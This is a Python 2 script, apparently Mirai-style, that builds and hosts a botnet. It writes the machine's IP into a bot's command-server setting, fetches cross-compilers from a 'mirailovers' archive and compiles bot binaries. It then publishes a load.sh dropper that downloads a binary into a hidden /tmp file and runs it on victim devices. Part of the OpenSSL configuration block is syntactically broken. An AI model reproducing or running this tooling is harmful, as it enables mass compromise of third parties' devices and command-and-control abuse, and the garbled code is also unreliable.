#!/usr/bin/env python2
# -*- coding: utf-8 -*-
import sys
import os
import urllib
import subprocess
import fileinput

def run(cmd):
    try:
        print("\033[34m[EXEC]\033[0m " + cmd)
        subprocess.check_call(cmd, shell=True, stderr=subprocess.STDOUT)
    except subprocess.CalledProcessError as e:
        print("\033[31m[ERROR] Command failed: {}\033[0m".format(cmd))
        sys.exit(1)

def get_ip():
    try:
        return urllib.urlopen('http://api.ipify.org').read().strip()
    except Exception as e:
        print("\033[31m[ERROR] Can't get IP address\033[0m")
        sys.exit(1)

def install_dependencies():
    print("\033[32m[+] Installing dependencies\033[0m")
    run("apt-get install -y --no-install-recommends "
        "gcc perl libssl-dev "
        "gcc-arm-linux-gnueabihf "
        "gcc-mips-linux-gnu "
        "gcc-aarch64-linux-gnu")

def patch_source(ip):
    print("\033[32m[+] Patching source code\033[0m")
    try:
        for line in fileinput.FileInput("bot.c", inplace=1):
            if "commServer[]" in line:
                print('const char *commServer[] = {{"{}:4258"}};'.format(ip))
            else:
                print(line.rstrip())
    except Exception as e:
        print("\033[31m[ERROR] Patching failed: {}\033[0m".format(str(e)))
        sys.exit(1)

def setup_openssl():
    print("\033[32m[+] Configuring OpenSSL paths\033[0m")
    openssl_arch_config = {
        },
        "x86_64": {
            "include": "/usr/include/x86_64-linux-gnu/openssl",
            "lib": "/usr/lib/x86_64-linux-gnu"
        }
    }
    return openssl_arch_config

def download_compilers():
    print("\033[32m[+] Downloading cross-compilers\033[0m")
    compilers = [
        ("x86_64", "https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-x86_64.tar.bz2")
    ]
    
    for arch, url in compilers:
        if not os.path.exists("cross-compiler-{}".format(arch)):
            run("wget --no-check-certificate {} -O {}.tar.bz2".format(url, arch))
            run("tar xjf {}.tar.bz2".format(arch))
            run("rm -f {}.tar.bz2".format(arch))

def compile_binaries(openssl_config):
    print("\033[32m[+] Compiling binaries\033[0m")
    targets = [
        ("x86_64", "x86_64", "x86_64-linux-gnu")
    ]

    for target_arch, dirname, linux_arch in targets:
        cc_path = "./cross-compiler-{}/bin/{}-gcc".format(dirname, target_arch)
        output_file = "bin.{}".format(target_arch)
        
        compile_cmd = (
            "{} -static -O2 -pthread "
            "-I{include_path} -L{lib_path} "
            "bot.c -o {output} "
            "-lssl -lcrypto -ldl"
        ).format(
            cc_path,
            include_path=openssl_config[target_arch]["include"],
            lib_path=openssl_config[target_arch]["lib"],
            output=output_file
        )
        
        run(compile_cmd)

def setup_web_server(ip):
    print("\033[32m[+] Configuring web server\033[0m")
    run("mkdir -p /var/www/html")
    run("chmod 755 /var/www/html")
    run("systemctl stop apache2 2>/dev/null || true")
    
    # Deploy binaries
    for f in os.listdir("."):
        if f.startswith("bin."):
            run("cp {} /var/www/html/".format(f))
    
    # Create loader script
    with open("/var/www/html/load.sh", "w") as f:
        f.write("#!/bin/sh\n")
        f.write("ulimit -n 99999\n")
        for arch in ["x86_64"]:
            f.write(
                "wget -q http://{}/bin.{} -O /tmp/.{}\n"
                "chmod +x /tmp/.{}\n"
                "/tmp/.{} &\n".format(ip, arch, arch, arch, arch)
            )
    run("chmod 755 /var/www/html/load.sh")
    run("systemctl start apache2")

if __name__ == "__main__":
    if os.getuid() != 0:
        print("\033[31m[ERROR] Requires root privileges!\033[0m")
        sys.exit(1)

    c2_ip = get_ip()
    install_dependencies()
    patch_source(c2_ip)
    openssl_cfg = setup_openssl()
    download_compilers()
    compile_binaries(openssl_cfg)
    setup_web_server(c2_ip)

    print("\n\033[32m[+] Compilation successful!\033[0m")
    print("\033[33m[!] Payload URL: http://{}/load.sh\033[0m".format(c2_ip))
    print("\033[33m[!] Cleanup command: rm -rf /var/www/html/bin.*\033[0m")